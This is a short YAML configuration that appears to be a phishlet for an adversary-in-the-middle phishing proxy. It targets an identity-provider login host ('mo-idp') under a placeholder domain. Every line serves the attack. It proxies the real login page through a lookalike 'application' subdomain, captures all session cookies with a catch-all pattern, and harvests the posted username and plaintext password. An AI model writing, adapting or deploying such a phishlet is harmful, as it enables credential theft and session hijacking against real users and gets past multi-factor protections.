
author: 'sny7er'
min_ver: '2.3.0'
proxy_hosts:

  - {phish_sub: 'application', orig_sub: 'mo-idp', domain: 'domain.com', session: true, is_landing: true, auto_filter: true}

auth_tokens:
  - domain: 'application.domain.com'
    keys: ['.*,regexp']
auth_urls:
  - '/enduserwelcome'
credentials:
  username:
    key: 'username'
    search: '(.*)'
    type: 'post'
  password:
    key: 'plaintextPassword'
    search: '(.*)'
    type: 'post'

login:
  domain: 'application.domain.com'
  path: '/login'
  
